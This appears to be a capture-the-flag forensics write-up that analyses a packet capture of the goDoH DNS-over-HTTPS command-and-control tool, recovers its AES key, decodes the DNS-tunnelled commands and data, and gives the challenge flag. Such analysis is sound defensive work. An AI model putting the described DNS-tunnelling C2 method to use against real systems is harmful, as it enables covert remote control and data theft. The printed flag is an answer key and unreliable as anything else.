# steal <!-- omit in toc -->

```
Someone steal my flag, can you retrieve it? All I have is this packet capture
```

```
[hint] find the key and decrypt the packet
```

```
$ file hackersteal.pcap          
hackersteal.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

- [Introduction](#introduction)
- [Information collection](#information-collection)
  - [DNS packets analysis](#dns-packets-analysis)
  - [godoh analysis](#godoh-analysis)
    - [Finding the key](#finding-the-key)
    - [decoding commands](#decoding-commands)
- [Solution](#solution)

## Introduction
This is a forensics challenge, though it contains aspects of reverse engineering.

This challenge is using a program called [goDoH], which is a PoC for DNS over HTTPS.

The `PCAP` file is very simple, and does not contain a lot of unrelated info.

First, it download the binary `godoh`, then run the binary.
The good thing about this challenge, is that the source code is open, which
makes analysis easier.

## Information collection
When opening the `PCAP` it may seem very big with a lot of packets, but **(97%)** of
it is just downloading [goDoh] binary. `(tcp.stream eq 0)`.

We can extract the binary from the packet **(4231)** which is **(3289456 bytes)**
The extracted [binary](./binary).

getting back to the binary later in [godoh analysis](#godoh-analysis)

### DNS packets analysis

After downloading the file, series of DNS messages starts, and they are not
normal DNS, exmaples:
```
- 6739746e73.dooh.aymjnd.com
- d45a2253ed6fdffd9eb0f2e88ba439d9ce61ee6d3c1ae717f05641029d57.dooh.aymjnd.com
- 6982.ef.2.2b4e6ec0.1.3.6fefba12ed91bde10b7d31217c5842a4d5d54d5d4dbc8819d9c82a8fd1bd.2715ea51509cff4c0fab2e32f6f2700a2dccf5e7010000ffffdc404e107d.000000.dooh.aymjnd.com
- ...
```

looks like hex, but converts to binary.
We need to analyse the binary which is responsible for this.

### godoh analysis
The binary appears to be `golang` executable, stripped, and UPX packed.

Even after upacking, its not easy to analyse, but looking at the output of
the file we get (part of the help message):
```
A DNS (over-HTTPS) C2
    Version: a10879c
        By @leonjza from @sensepost
Usage:
  godoh [flags]
  godoh [command
```

That's how I knew its a project called `godoh`, and found [this][goDoh]
repo.

Looking in the repo, I think the part of the code responsible for this DNS is
[cmd/agent.go](https://github.com/sensepost/goDoH/blob/master/cmd/agent.go)

```go
// trunked...
for {
    // trunked...
    response := dnsclient.Lookup(dnsProvider,
                    fmt.Sprintf("%x.%s", agentCmdAgentName, dnsDomain), dns.TypeTXT)

    // Do nothing.
    if strings.Contains(response.Data, protocol.NoCmdTxtResponse[0]) {
        continue
    }
    // trunked...
}
// trunked...
```

from [protocol/constants.go](https://github.com/sensepost/goDoH/blob/master/protocol/constants.go):
```go
var (
	NoCmdTxtResponse = []string{
		"v=B2B3FE1C",
	}
	ErrorTxtResponse = []string{
		"v=D31CFAA4",
	}
	CmdTxtResponse = []string{
		"v=A9F466E8",
	}
)
```

when looking at the `PCAP`, we actually see `6739746e73.dooh.aymjnd.com` get sent
multiple times, and in all of the times, except for the last one we get
`v=B2B3FE1C` as a response, and then we get `v=A9F466E8` which means that
there is a command, which is held in `p=` argument in the response.

looking at `agent.go`, we see that arguement `p=` is being decrypted using
`UngobUnpress` function in [utils/utils.go](https://github.com/sensepost/goDoH/blob/master/utils/utils.go). which:
1) gUnzip the data bytes
2) Decrypt them using AES with a defined key in [utils/key.go](https://github.com/sensepost/goDoH/blob/master/utils/key.go)
3) Parse the JSON data (not important for our analysis).

The gUnzip part is easy, as for decryption. I tried decrypting it using the key
in the repo but didn't gave any useful data but just binary garbage.

> I didn't try to decode this `p=` in the time of the CTF, and went to the other
> packets and also didn't work as I was in need to the key, which was different
> from the key in the repo.

#### Finding the key
As stated in the help message of `godoh`, this version of the binary is the latest
version in the repo (as of writing this write-up). **(a10879c)**

In the readme of the project it says, when building the project you should run
```
make key
```
in order to replace the key in `utils/key.go` with another one generated by random
from 
```
openssl rand -hex 16
```

When trying to get the key, I tried looking for it using `strings` and others analysis techniques but couldn't find the key.

The way I got the key is:
1) build the `godoh` project yourself with a key you know.
2) Try to find the key using `strings` as it might be part of other strings.

First, building:
```bash
$ make key
sed -i -E "s/const.*/const cryptKey = \`5a50a63cf4562528174ea92321852b4c\`/g" utils/key.go
$ go build
# trunked
$ make
# trunked
```

When looking for `5a50a63cf4562528174ea92321852b4c` in `strings` of the binary
I wasn't able to find it, but then I remembered that this is a UPX packed binary.
So when unpacking it, it worked and we found a string containing the key.
```
$ upx -d ./build/godoh-linux64          
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   8855552 <-   3289732   37.15%   linux/amd64   godoh-linux64

Unpacked 1 file.
```

```bash
$ strings ./build/godoh-linux64 | grep '5a50a63cf4562528174ea92321852b4c'
 (types from different packages)/etc/pki/tls/certs/ca-bundle.crt0123456789ABCDEFGHIJKLMNOPQRSTUV284217094304040074348449707031255a50a63cf4562528174ea92321852b4c: day-of-year does not match dayA DNS domain to use is required.ABCDEFGHIJKLMNOPQRSTUVWXYZ234567DNS provider `%s` is not valid.
```
which is the last part before `": day-of-year does"`.

Now, trying to find this string in our binary
```bash
$ strings ./binary | grep "types from different packages"                          
 (types from different packages)/etc/pki/tls/certs/ca-bundle.crt0123456789ABCDEFGHIJKLMNOPQRSTUV284217094304040074348449707031258a40cdd5c4608b251b2c5926270540dc: day-of-year does not match dayA DNS domain to use is required.ABCDEFGHIJKLMNOPQRSTUVWXYZ234567DNS provider `%s` is not valid.
```

WOO, we got the key
```
8a40cdd5c4608b251b2c5926270540dc
```
#### decoding commands
I copied part of the code needed for decryption from the repo to [solve.go](solve.go)

When decoding the `p=` argument of the first command we get this, which seems very promising.
```
ls flag
```

Next, there is a DNS request with the address of
`d45a2253ed6fdffd9eb0f2e88ba439d9ce61ee6d3c1ae717f05641029d57.dooh.aymjnd.com`
but I don't know what it means, though we can solve for the flag without it.

Next,
`6982.ef.1.d1308add.1.3.1f8b08000000000002ff007d0082ff2e8c8da9989c7b986ca497950bfbe8.fc213cd3e5f135206a17346ac8e74e519f27525be6a166c0ba8f97a3c51a.d45a2253ed6fdffd9eb0f2e88ba439d9ce61ee6d3c1ae717f05641029d57.dooh.aymjnd.com`

This is a long DNS string, trying to find the producing piece of code in the
repo and found that this is from [protocol/utils.go](https://github.com/sensepost/goDoH/blob/master/protocol/utils.go) the function `Requestify`.


In this method, it splits a piece of bytes data into DNS requests and it matches
the request above, actually before the long DNS request above there is another
smaller version of it `6982.be.0.00.1.0.0.0.0.dooh.aymjnd.com`.

Looking at the code, the small DNS is to indicates the starting of the stream as
shown in the constants:
```go
// Request stream status
const (
	StreamStart = 0xbe
	StreamData  = 0xef
	StreamEnd   = 0xca
)
```

For starting
```go
// seq-1 is always 0
// crc32 checksum is also 00
initRequest := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%x.%x.%x",
		ident, StreamStart, seq-1, crc32.ChecksumIEEE(emptyBytes), protocol, 0, 0x00, 0x00, 0x00)
```

For data sending
```go
// dataLabel is the data splitted into 3 parts at most or less with 0 padding
// seq is the number of the sequence, same as TCP
request := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%s",
            ident, StreamData, seq, crc32.ChecksumIEEE(s), protocol, len(labelSplit), dataLabel)
```

For destructing
```go
destructRequest := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%x.%x.%x",
		ident, StreamEnd, seq, crc32.ChecksumIEEE(emptyBytes), protocol, 0, 0x00, 0x00, 0x00)
```

from all the above we know that DNS requests addresses that starts with the same `ident` are part of the same data which can be sorted using the `seq` number.

## Solution
After getting the data from the `PCAP` and using our decrypter we get
```json
1f8b08000000000002ff007d0082ff2e8c8da9989c7b986ca497950bfbe8fc213cd3e5f135206a17346ac8e74e519f27525be6a166c0ba8f97a3c51ad45a2253ed6fdffd9eb0f2e88ba439d9ce61ee6d3c1ae717f05641029d576fefba12ed91bde10b7d31217c5842a4d5d54d5d4dbc8819d9c82a8fd1bd2715ea51509cff4c0fab2e32f6f2700a2dccf5e7010000ffffdc404e107d000000
===
{"exec":"lsflag","data":"ZmxhZy50eHQK","exectime":"2019-12-13T19:31:49.794719301+08:00","identifier":"lkcem"}
```

and another one
```json
1f8b08000000000002ff007d0082ffbb142bfd17b60cbf5365894c6fc3089cdd1025388213a96fe20dccc435bb312e07d58441c806f9ef34395fe760212c26dc6367e8cd220d8a26bf2d34bab4e2adcbaca3010196398c4a79365e1c27340f4f984d84b5ffde137e16df5a8ad9b8f028ee1476c307e71bab37fdb0f98be04c2bbd5443f10e1f91bff1681182010000fffff7f3c9337d000000
===
{"exec":"lsflag","data":"ZmxhZy50eHQK","exectime":"2019-12-13T19:31:52.900816495+08:00","identifier":"3xu4j"}
```

lastly, we get our main fruit
```json
1f8b08000000000002ff00af0050ff044f1a467dab6b9371a8cbd55cce223a2573f4144345f8a1d43d7db33258a794d5da83bfabbe5ac3ab36f9c2b9b034091202a6dc5dd67f0d42cc641c379f89de12a56214b519d468347eea14a7ef621e4f3ff9c9b86185b663b4490379da470226b4ad98b3500ef75d241afae01cdd0e1e0f22760b44f8bb2fb1f9ff308b2565d5d2fb59988723ce11e8bc68186ff4b768244f79dc5503ceafb9b60841f9ce7869c048644a318e9196358851879d4d010000ffff3cd91697af000000
===
{"exec":"catflag/flag.txt","data":"d2dteXtmYTU2YzUyZWNhMjA5MjMzMDYxZWM3NmYwZTRkZWZmOX0K","exectime":"2019-12-13T19:32:02.050709318+08:00","identifier":"4nq58"}
```

decrypting the base64 flag, we get:

```
wgmy{fa56c52eca209233061ec76f0e4deff9}
```

[goDoH]: https://github.com/sensepost/goDoH